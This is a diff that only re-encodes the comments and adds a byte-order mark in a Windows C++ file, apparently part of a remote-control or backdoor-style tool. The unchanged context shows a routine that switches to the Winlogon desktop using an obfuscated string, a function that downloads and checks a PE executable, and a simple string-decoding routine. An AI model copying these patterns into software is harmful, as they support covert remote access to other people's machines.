@@ -1,4 +1,4 @@
-#include "stdafx.h"
+ï»¿#include "stdafx.h"
 #include <windows.h>
 #include <process.h>
 #include <Tlhelp32.h>
@@ -18,8 +18,8 @@ unsigned int __stdcall ThreadLoader(LPVOID param)
         THREAD_ARGLIST	arg;
         memcpy(&arg, param, sizeof(arg));
         SetEvent(arg.hEventTransferArg);
-        // Óë×¿Ãæ½»»¥
-        //TODO: ¸ãÇå³þÕâ¸öÊÇ×öÊ²Ã´ÓÃµÄ
+        // ä¸Žå“é¢äº¤äº’
+        //TODO: æžæ¸…æ¥šè¿™ä¸ªæ˜¯åšä»€ä¹ˆç”¨çš„
         if (arg.bInteractive)
             SelectDesktop(NULL);
 
@@ -275,7 +275,7 @@ BOOL SimulateCtrlAltDel()
     HDESK old_desktop = GetThreadDesktop(GetCurrentThreadId());
 
     // Switch into the Winlogon desktop
-    TCHAR str1[50] = TEXT("—ehjogoh");
+    TCHAR str1[50] = TEXT("æ¢•hjogoh");
     EncryptData((TCHAR *)&str1, lstrlen(str1), 98);
     if (!SelectDesktop(str1))
     {
@@ -318,7 +318,7 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
         {
             memset(buffer, 0, sizeof(buffer));
             InternetReadFile(hUrl, buffer, sizeof(buffer), &dwBytesRead);
-            // ÓÉÅÐ¶ÏµÚÒ»¸öÊý¾Ý°üÊÇ²»ÊÇÓÐÐ§µÄPEÎÄ¼þ
+            // ç”±åˆ¤æ–­ç¬¬ä¸€ä¸ªæ•°æ®åŒ…æ˜¯ä¸æ˜¯æœ‰æ•ˆçš„PEæ–‡ä»¶
             if (bIsFirstPacket && ((PIMAGE_DOS_HEADER)buffer)->e_magic != IMAGE_DOS_SIGNATURE)
             {
                 bRet = false;
@@ -337,9 +337,9 @@ bool http_get(LPCTSTR szURL, LPCTSTR szFileName)
     return bRet;
 }
 
-//void EncryptData(unsigned TCHAR *szRec, unsigned long nLen, unsigned long key)//½âÃÜ
+//void EncryptData(unsigned TCHAR *szRec, unsigned long nLen, unsigned long key)//è§£å¯†
 //by zhangyl
-void EncryptData(TCHAR *szRec, unsigned long nLen, unsigned long key)//½âÃÜ
+void EncryptData(TCHAR *szRec, unsigned long nLen, unsigned long key)//è§£å¯†
 {
     unsigned long i;
     unsigned char p;
